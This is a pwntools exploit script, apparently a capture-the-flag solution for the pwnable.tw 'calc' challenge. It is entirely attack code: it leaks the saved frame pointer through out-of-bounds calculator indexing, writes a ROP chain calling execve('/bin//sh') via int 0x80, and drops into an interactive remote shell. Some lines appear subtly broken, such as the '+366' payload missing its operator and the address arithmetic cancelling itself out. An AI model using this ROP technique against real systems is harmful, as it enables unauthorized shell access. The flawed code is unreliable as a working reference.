from pwn import *

"""
+360 => ebp
+361 => pop_eax_ret
+362 => 0xb
+363 => pop_edx_ecx_ebx_ret
+364 => 0
+365 => 0
+366 => address of /bin//sh
+367 => int 0x80
+368 => //sh 0x68732f2f
+369 => /bin 0x6e69622f
"""

#r = process('./calc')

r = remote('chall.pwnable.tw',10100)

pop_eax_ret = 0x0805c34b

pop_edx_ecx_ebx_ret = 0x080701d0

syscall = 0x08049a21

str_bin = 0x6e69622f

str_sh = 0x0068732f

def leak_ebp():
    r.recv()
    r.sendline('+360')
    ebp = int(r.recvline())
    ebp = ebp + 0x100000000
    bin_sh_addr = ebp - 0x100000000
    return bin_sh_addr

def set_rop():
    bin_sh_addr = leak_ebp()
    for i in range(361,370):
        r.sendline('+{}'.format(i))
        diff = int(r.recvline())
        print(diff)
        # set zero 
        if diff < 0 :
            r.sendline('+{}+{}'.format(i,str(diff).strip('-')))
            r.recvline()
        elif diff > 0 :
            r.sendline('+{}-{}'.format(i,str(diff)))
            r.recvline()
        # set parameters
        if i == 361 :
            r.sendline('+361+'+str(int(pop_eax_ret)))
            r.recvline()
        elif i == 362 :
            r.sendline('+362+11')
            r.recvline()
        elif i == 363 :
            r.sendline('+363+'+str(int(pop_edx_ecx_ebx_ret)))
            r.recvline()
        elif i == 366 :
            r.sendline('+366'+str(bin_sh_addr))
            r.recvline()
        elif i == 367 :
            r.sendline('+367+'+str(int(syscall)))
            r.recvline()
        elif i == 368 :
            r.sendline('+368+'+str(int(str_bin)))
            r.recvline()
        elif i == 369 :
            r.sendline('+369+'+str(int(str_sh)))
            r.recvline()

def main():
    set_rop()
    r.interactive()

if __name__ == "__main__":
    main()
